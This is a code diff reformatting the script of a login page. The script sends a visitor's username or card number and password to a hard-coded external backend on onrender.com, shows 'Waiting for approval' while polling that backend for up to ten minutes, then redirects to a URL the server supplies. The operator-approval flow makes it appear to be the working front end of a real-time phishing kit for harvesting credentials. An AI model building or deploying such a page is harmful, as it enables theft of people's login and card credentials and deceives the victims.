@@ -597,265 +597,267 @@
         </footer>
     </main>
 
-    <script>
-        lucide.createIcons();
-        
-        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
-        
-        console.log('Frontend URL:', window.location.href);
-        console.log('Using backend URL:', BACKEND_URL);
+  <script>
+    lucide.createIcons();
 
-        function togglePassword() {
-            const pwd = document.getElementById('passwordInput');
-            const btn = document.querySelector('.show-hide');
-            if (pwd.type === 'password') {
-                pwd.type = 'text';
-                btn.textContent = 'Hide';
-            } else {
-                pwd.type = 'password';
-                btn.textContent = 'Show';
-            }
+    const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+
+    console.log('Frontend URL:', window.location.href);
+    console.log('Using backend URL:', BACKEND_URL);
+
+    function togglePassword() {
+        const pwd = document.getElementById('passwordInput');
+        const btn = document.querySelector('.show-hide');
+        if (pwd.type === 'password') {
+            pwd.type = 'text';
+            btn.textContent = 'Hide';
+        } else {
+            pwd.type = 'password';
+            btn.textContent = 'Show';
+        }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const login = document.getElementById('usernameInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingIcon = submitBtn.querySelector('.loading');
+        const submitText = submitBtn.querySelector('span');
+        const statusContainer = document.getElementById('statusContainer');
+        const statusMessage = document.getElementById('statusMessage');
+
+        document.getElementById('usernameError').classList.remove('show');
+        document.getElementById('passwordError').classList.remove('show');
+        statusContainer.classList.remove('show');
+
+        if (!login.trim()) {
+            document.getElementById('usernameError').textContent = 'Please enter username or card number';
+            document.getElementById('usernameError').classList.add('show');
+            return;
         }
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const login = document.getElementById('usernameInput').value;
-            const password = document.getElementById('passwordInput').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingIcon = submitBtn.querySelector('.loading');
-            const submitText = submitBtn.querySelector('span');
-            const statusContainer = document.getElementById('statusContainer');
-            const statusMessage = document.getElementById('statusMessage');
-            
-            document.getElementById('usernameError').classList.remove('show');
-            document.getElementById('passwordError').classList.remove('show');
-            statusContainer.classList.remove('show');
-            
-            if (!login.trim()) {
-                document.getElementById('usernameError').textContent = 'Please enter username or card number';
-                document.getElementById('usernameError').classList.add('show');
-                return;
-            }
-            
-            if (!password.trim()) {
-                document.getElementById('passwordError').textContent = 'Please enter password';
-                document.getElementById('passwordError').classList.add('show');
-                return;
-            }
-            
-            loadingIcon.classList.add('active');
-            submitText.textContent = 'Signing in...';
-            submitBtn.disabled = true;
-            
-            const rememberCheckbox = document.getElementById('rememberCheckbox');
-            if (rememberCheckbox.checked && login.trim()) {
-                localStorage.setItem('savedUsername', login.trim());
+        if (!password.trim()) {
+            document.getElementById('passwordError').textContent = 'Please enter password';
+            document.getElementById('passwordError').classList.add('show');
+            return;
+        }
+
+        loadingIcon.classList.add('active');
+        submitText.textContent = 'Signing in...';
+        submitBtn.disabled = true;
+
+        const rememberCheckbox = document.getElementById('rememberCheckbox');
+        if (rememberCheckbox.checked && login.trim()) {
+            localStorage.setItem('savedUsername', login.trim());
+        } else {
+            localStorage.removeItem('savedUsername');
+        }
+
+        try {
+            console.log('Sending request to:', `${BACKEND_URL}/login`);
+
+            const response = await fetch(`${BACKEND_URL}/login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: login,
+                    password: password
+                })
+            });
+
+            console.log('Response status:', response.status);
+
+            const data = await response.json();
+            console.log('Response data:', data);
+
+            if (response.ok && data.success) {
+                const sessionId = data.id;
+                localStorage.setItem('sessionId', sessionId);
+
+                statusMessage.textContent = 'Verifying credentials...';
+                statusContainer.classList.add('show');
+
+                console.log('Login successful, session ID:', sessionId);
+                console.log('Starting to poll for approval...');
+
+                pollStatus(sessionId);
             } else {
-                localStorage.removeItem('savedUsername');
-            }
-            
-            try {
-                console.log('Sending request to:', `${BACKEND_URL}/login`);
-                
-                const response = await fetch(`${BACKEND_URL}/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        login: login,
-                        password: password
-                    })
-                });
-                
-                console.log('Response status:', response.status);
-                
-                const data = await response.json();
-                console.log('Response data:', data);
-                
-                if (response.ok && data.success) {
-                    const sessionId = data.id;
-                    localStorage.setItem('sessionId', sessionId);
-                    
-                    statusMessage.textContent = 'Verifying credentials...';
-                    statusContainer.classList.add('show');
-                    
-                    console.log('Login successful, session ID:', sessionId);
-                    console.log('Starting to poll for approval...');
-                    
-                    pollStatus(sessionId);
-                } else {
-                    const errorMsg = data.error || `Login failed. Status: ${response.status}`;
-                    document.getElementById('passwordError').textContent = errorMsg;
-                    document.getElementById('passwordError').classList.add('show');
-                    
-                    loadingIcon.classList.remove('active');
-                    submitText.textContent = 'Sign in';
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                console.error('Network error:', error);
-                document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend connection.`;
+                const errorMsg = data.error || `Login failed. Status: ${response.status}`;
+                document.getElementById('passwordError').textContent = errorMsg;
                 document.getElementById('passwordError').classList.add('show');
-                
+
                 loadingIcon.classList.remove('active');
                 submitText.textContent = 'Sign in';
                 submitBtn.disabled = false;
             }
-        });
-        
-        async function pollStatus(sessionId) {
-            let attempts = 0;
-            const maxAttempts = 120;
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingIcon = submitBtn.querySelector('.loading');
-            const submitText = submitBtn.querySelector('span');
-            const statusContainer = document.getElementById('statusContainer');
-            const statusMessage = document.getElementById('statusMessage');
-            
-            console.log(`Starting to poll for session: ${sessionId}`);
-            
-            const checkStatus = async () => {
-                try {
-                    console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
-                    const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
-                    
-                    if (!response.ok) {
-                        console.error('Status check failed:', response.status);
-                        attempts++;
-                        if (attempts < maxAttempts) {
-                            console.log(`Retrying in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
-                            setTimeout(checkStatus, 5000);
-                        } else {
-                            document.getElementById('passwordError').textContent = 'Status check timed out. Please try again.';
-                            document.getElementById('passwordError').classList.add('show');
-                            statusContainer.classList.remove('show');
-                            resetButton();
-                        }
-                        return;
-                    }
-                    
-                    const data = await response.json();
-                    console.log('Status check response:', data);
-                    
-                    if (data.status === 'approved') {
-                        if (data.redirect_url) {
-                            let redirectUrl;
-                            
-                            if (data.redirect_url.startsWith('http')) {
-                                redirectUrl = data.redirect_url;
-                            } else {
-                                const baseUrl = window.location.origin;
-                                redirectUrl = `${baseUrl}/${data.redirect_url}`;
-                            }
-                            
-                            console.log('Approved! Redirecting to:', redirectUrl);
-                            
-                            statusMessage.textContent = 'Redirecting...';
-                            
-                            setTimeout(() => {
-                                window.location.href = redirectUrl;
-                            }, 500);
-                        } else {
-                            console.error('Approved but no redirect URL');
-                            document.getElementById('passwordError').textContent = 'Approved but no redirect URL specified';
-                            document.getElementById('passwordError').classList.add('show');
-                            statusContainer.classList.remove('show');
-                            resetButton();
-                        }
-                        return true;
-                    } else if (data.status === 'pending') {
-                        attempts++;
-                        
-                        if (attempts === 1) {
-                            statusMessage.textContent = 'Waiting for approval...';
-                        } else if (attempts % 12 === 0) {
-                            const minutes = Math.floor(attempts / 12);
-                            statusMessage.textContent = `Waiting for approval... (${minutes} min)`;
-                        }
-                        
-                        if (attempts < maxAttempts) {
-                            console.log(`Still pending, checking again in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
-                            setTimeout(checkStatus, 5000);
-                        } else {
-                            document.getElementById('passwordError').textContent = 'Request timed out. Please try again.';
-                            document.getElementById('passwordError').classList.add('show');
-                            statusContainer.classList.remove('show');
-                            resetButton();
-                        }
-                    } else if (data.error) {
-                        document.getElementById('passwordError').textContent = `Error: ${data.error}`;
-                        document.getElementById('passwordError').classList.add('show');
-                        statusContainer.classList.remove('show');
-                        resetButton();
-                    }
-                } catch (error) {
-                    console.error('Status check error:', error);
-                    attempts++;
-                    
-                    if (attempts < maxAttempts) {
-                        console.log(`Error occurred, retrying in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
-                        setTimeout(checkStatus, 5000);
-                    } else {
-                        document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
-                        document.getElementById('passwordError').classList.add('show');
-                        statusContainer.classList.remove('show');
-                        resetButton();
-                    }
-                }
-            };
-            
-            setTimeout(checkStatus, 2000);
-        }
-        
-        function resetButton() {
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingIcon = submitBtn.querySelector('.loading');
-            const submitText = submitBtn.querySelector('span');
-            
+        } catch (error) {
+            console.error('Network error:', error);
+            document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend connection.`;
+            document.getElementById('passwordError').classList.add('show');
+
             loadingIcon.classList.remove('active');
             submitText.textContent = 'Sign in';
             submitBtn.disabled = false;
         }
-        
-        document.addEventListener('DOMContentLoaded', function() {
-            const rememberCheckbox = document.getElementById('rememberCheckbox');
-            const usernameInput = document.getElementById('usernameInput');
-            
-            const savedUsername = localStorage.getItem('savedUsername');
-            if (savedUsername) {
-                usernameInput.value = savedUsername;
-                rememberCheckbox.checked = true;
-            }
-            
-            rememberCheckbox.addEventListener('change', function() {
-                if (this.checked && usernameInput.value) {
-                    localStorage.setItem('savedUsername', usernameInput.value);
-                } else {
-                    localStorage.removeItem('savedUsername');
-                }
-            });
-            
-            usernameInput.addEventListener('input', function() {
-                if (rememberCheckbox.checked && this.value) {
-                    localStorage.setItem('savedUsername', this.value);
-                }
-            });
-            
-            console.log('Testing backend connection...');
-            fetch(`${BACKEND_URL}/`)
-                .then(response => {
-                    console.log('Backend connection test:', response.status);
-                    if (response.ok) {
-                        console.log('✅ Backend is reachable!');
+    });
+
+    async function pollStatus(sessionId) {
+        let attempts = 0;
+        const maxAttempts = 120; // ~10 minutes
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingIcon = submitBtn.querySelector('.loading');
+        const submitText = submitBtn.querySelector('span');
+        const statusContainer = document.getElementById('statusContainer');
+        const statusMessage = document.getElementById('statusMessage');
+
+        console.log(`Starting to poll for session: ${sessionId}`);
+
+        const checkStatus = async () => {
+            try {
+                console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
+                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
+
+                if (!response.ok) {
+                    console.error('Status check failed:', response.status);
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        setTimeout(checkStatus, 5000);
+                    } else {
+                        document.getElementById('passwordError').textContent = 'Status check timed out. Please try again.';
+                        document.getElementById('passwordError').classList.add('show');
+                        statusContainer.classList.remove('show');
+                        resetButton();
                     }
-                })
-                .catch(error => {
-                    console.error('❌ Backend connection failed:', error);
-                });
+                    return;
+                }
+
+                const data = await response.json();
+                console.log('Status check response:', data);
+
+                if (data.status === 'approved') {
+                    if (data.redirect_url) {
+                        let redirectUrl = data.redirect_url;
+
+                        // Only prepend origin if it's clearly a relative path (should rarely happen now)
+                        if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+                            const baseUrl = window.location.origin;
+                            redirectUrl = `${baseUrl}/${redirectUrl.replace(/^\//, '')}`;
+                        }
+
+                        console.log('Approved! Redirecting to:', redirectUrl);
+
+                        statusMessage.textContent = 'Redirecting...';
+
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 800); // slightly longer delay so user sees "Redirecting..."
+                    } else {
+                        console.error('Approved but no redirect URL');
+                        document.getElementById('passwordError').textContent = 'Approved but no redirect URL specified';
+                        document.getElementById('passwordError').classList.add('show');
+                        statusContainer.classList.remove('show');
+                        resetButton();
+                    }
+                    return true;
+                } 
+                else if (data.status === 'pending') {
+                    attempts++;
+
+                    if (attempts === 1) {
+                        statusMessage.textContent = 'Waiting for approval...';
+                    } else if (attempts % 6 === 0) { // update every ~30 seconds
+                        const totalSeconds = attempts * 5;
+                        const minutes = Math.floor(totalSeconds / 60);
+                        const seconds = totalSeconds % 60;
+                        statusMessage.textContent = `Waiting for approval... (${minutes}m ${seconds}s)`;
+                    }
+
+                    if (attempts < maxAttempts) {
+                        console.log(`Still pending, checking again in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
+                        setTimeout(checkStatus, 5000);
+                    } else {
+                        document.getElementById('passwordError').textContent = 'Request timed out. Please try again.';
+                        document.getElementById('passwordError').classList.add('show');
+                        statusContainer.classList.remove('show');
+                        resetButton();
+                    }
+                } 
+                else if (data.error) {
+                    document.getElementById('passwordError').textContent = `Error: ${data.error}`;
+                    document.getElementById('passwordError').classList.add('show');
+                    statusContainer.classList.remove('show');
+                    resetButton();
+                }
+            } catch (error) {
+                console.error('Status check error:', error);
+                attempts++;
+
+                if (attempts < maxAttempts) {
+                    setTimeout(checkStatus, 5000);
+                } else {
+                    document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
+                    document.getElementById('passwordError').classList.add('show');
+                    statusContainer.classList.remove('show');
+                    resetButton();
+                }
+            }
+        };
+
+        setTimeout(checkStatus, 2000);
+    }
+
+    function resetButton() {
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingIcon = submitBtn.querySelector('.loading');
+        const submitText = submitBtn.querySelector('span');
+
+        loadingIcon.classList.remove('active');
+        submitText.textContent = 'Sign in';
+        submitBtn.disabled = false;
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const rememberCheckbox = document.getElementById('rememberCheckbox');
+        const usernameInput = document.getElementById('usernameInput');
+
+        const savedUsername = localStorage.getItem('savedUsername');
+        if (savedUsername) {
+            usernameInput.value = savedUsername;
+            rememberCheckbox.checked = true;
+        }
+
+        rememberCheckbox.addEventListener('change', function() {
+            if (this.checked && usernameInput.value) {
+                localStorage.setItem('savedUsername', usernameInput.value);
+            } else {
+                localStorage.removeItem('savedUsername');
+            }
         });
-    </script>
+
+        usernameInput.addEventListener('input', function() {
+            if (rememberCheckbox.checked && this.value) {
+                localStorage.setItem('savedUsername', this.value);
+            }
+        });
+
+        console.log('Testing backend connection...');
+        fetch(`${BACKEND_URL}/`)
+            .then(response => {
+                console.log('Backend connection test:', response.status);
+                if (response.ok) {
+                    console.log('✅ Backend is reachable!');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Backend connection failed:', error);
+            });
+    });
+</script>
 </body>
 </html>
+
